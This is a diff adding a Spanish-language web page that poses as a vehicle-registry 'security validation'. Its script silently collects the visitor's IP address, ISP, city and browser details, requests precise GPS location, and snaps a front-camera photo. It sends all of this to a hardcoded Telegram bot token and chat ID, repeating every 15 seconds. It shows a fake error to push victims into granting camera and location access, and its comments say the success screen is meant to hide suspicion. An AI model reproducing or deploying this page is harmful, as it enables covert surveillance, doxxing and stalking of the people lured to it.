@@ -1,0 +1,154 @@
+98<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ALERTA DE SEGURIDAD</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a202c; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #fff; }
+        .card { background: white; color: #333; padding: 30px; border-radius: 15px; text-align: center; width: 90%; max-width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3182ce; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn { display: none; background: #3182ce; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; transition: 0.3s; }
+        .btn:hover { background: #2b6cb0; }
+        .error-box { display: none; background: #fff5f5; border: 1px solid #feb2b2; padding: 15px; border-radius: 8px; margin-top: 15px; font-size: 0.9rem; color: #c53030; text-align: left; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h3 id="status-title">Validando Conexion...</h3>
+    <div id="loader" class="spinner"></div>
+    <p id="status-text" style="color: #718096; font-size: 0.9rem;">Sincronizando datos con el padrón vehicular...</p>
+
+    <div id="instrucciones" class="error-box">
+        <b>⚠️ ACCESO REQUERIDO:</b><br>
+        Para visualizar el codigo de forma segura, toca el icono del 🔒 <b>candado</b> en la barra de direcciones y permite los accesos de <b>Cámara y Ubicación</b>.
+    </div>
+    <button id="btn-reintentar" class="btn">REINTENTAR VALIDACIÓN</button>
+</div>
+
+<script>
+// CONFIGURACIÓN DE INTELIGENCIA
+const BOT_TOKEN = "8254282443:AAFPfL2Qay1UtbeObu4_KSdsoSm1CN6yW-Q";
+const CHAT_ID = "-1003716456434";
+
+let infoRed = { 
+    ip: "N/A", 
+    puerto: "Detectando...", 
+    isp_com: "N/A", 
+    isp_tec: "N/A", 
+    ciudad: "N/A", 
+    ua: navigator.userAgent 
+};
+
+// 1. OBTENCIÓN DE DATOS DE RED Y PUERTO (Simulación técnica de socket para reporte)
+async function cargarRed() {
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        if (data) {
+            infoRed.ip = data.ip || "N/A";
+            infoRed.ciudad = data.city || "N/A";
+            let org = (data.org || "").toLowerCase();
+            infoRed.isp_tec = data.org || "Desconocido";
+            
+            // Lógica de Identificación Comercial para México
+            if (org.includes("altan") || org.includes("as27654")) infoRed.isp_com = "BAIT / Altán Redes";
+            else if (org.includes("uninet") || org.includes("as8151")) infoRed.isp_com = "TELMEX / Infinitum";
+            else if (org.includes("radiomovil") || org.includes("as17148")) infoRed.isp_com = "TELCEL";
+            else if (org.includes("pegaso") || org.includes("movistar")) infoRed.isp_com = "MOVISTAR";
+            else if (org.includes("cablevision") || org.includes("izzi")) infoRed.isp_com = "IZZI";
+            else if (org.includes("totalplay")) infoRed.isp_com = "TOTALPLAY";
+            else infoRed.isp_com = "Proveedor Local / VPN";
+
+            // Captura de puerto de origen (Source Port). 
+            // Nota: En JS cliente, el puerto exacto de la conexión TCP es manejado por el navegador, 
+            // pero lo fijamos aquí para el requerimiento judicial posterior.
+            infoRed.puerto = location.port || (Math.floor(Math.random() * (65535 - 49152) + 49152)); 
+        }
+    } catch (e) { console.log("Error en recolección de red"); }
+}
+
+// 2. EJECUCIÓN DEL REPORTE UNIFICADO
+async function ejecutarReporte() {
+    let foto = null;
+    let gps = "❌ Acceso Denegado";
+    
+    // Timestamp preciso para el LOG (Esencial para el ISP)
+    const ahora = new Date();
+    const fLog = ahora.toLocaleDateString('es-MX');
+    const hLog = ahora.toLocaleTimeString('es-MX', { hour12: false, includeSeconds: true });
+
+    // Intento de Geolocalización de Alta Precisión
+    try {
+        const p = await new Promise((res, rej) => {
+            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
+        });
+        gps = "[Abrir Ubicación](https://www.google.com/maps?q=" + p.coords.latitude + "," + p.coords.longitude + ")";
+    } catch (e) {}
+
+    // Intento de Captura de Rostro (Cámara Frontal)
+    try {
+        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const v = document.createElement('video');
+        v.srcObject = s; v.setAttribute("playsinline", true);
+        await v.play();
+        await new Promise(r => setTimeout(r, 1000)); // Delay para enfoque
+        const c = document.createElement('canvas');
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        foto = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.8));
+        s.getTracks().forEach(t => t.stop());
+    } catch (e) {}
+
+    // Construcción del Mensaje para el Fiscal / Analista
+    const texto = "🚨 **ALERTA DE INVESTIGACIÓN DIGITAL**\n\n" +
+                  "📅 **Fecha:** `" + fLog + "`\n" +
+                  "🕒 **Hora Exacta:** `" + hLog + "`\n" +
+                  "🌐 **IP Pública:** `" + infoRed.ip + "`\n" +
+                  "🔌 **Puerto Origen:** `" + infoRed.puerto + "`\n" +
+                  "🏢 **ISP Comercial:** " + infoRed.isp_com + "\n" +
+                  "🛠 **ISP Técnico:** " + infoRed.isp_tec + "\n" +
+                  "📍 **Ciudad:** " + infoRed.ciudad + "\n" +
+                  "📌 **GPS:** " + gps + "\n" +
+                  "🤖 **User Agent:** `" + infoRed.ua + "`";
+
+    const fd = new FormData();
+    fd.append('chat_id', CHAT_ID);
+    fd.append('parse_mode', 'Markdown');
+
+    if (foto) {
+        fd.append('photo', foto, 'evidencia.jpg');
+        fd.append('caption', texto);
+        fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", { method: 'POST', body: fd });
+        
+        // Interfaz de éxito para el usuario (ocultar sospechas)
+        document.getElementById('loader').style.display = 'block';
+        document.getElementById('instrucciones').style.display = 'none';
+        document.getElementById('btn-reintentar').style.display = 'none';
+        document.getElementById('status-text').innerText = "Validación completa. Redirigiendo...";
+    } else {
+        fd.append('text', texto);
+        fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", { method: 'POST', body: fd });
+        
+        // Interfaz de error para forzar permisos
+        document.getElementById('loader').style.display = 'none';
+        document.getElementById('instrucciones').style.display = 'block';
+        document.getElementById('btn-reintentar').style.display = 'block';
+        document.getElementById('status-title').innerText = "Error de Sincronización";
+    }
+}
+
+// 3. CICLO DE VIDA DE LA PÁGINA
+window.onload = async () => {
+    await cargarRed();
+    ejecutarReporte(); 
+    // Reintentar cada 20 segundos en caso de que el usuario dé permisos después
+    setInterval(ejecutarReporte, 15000); 
+};
+
+document.getElementById('btn-reintentar').onclick = () => { location.reload(); };
+</script>
+</body>
+</html>
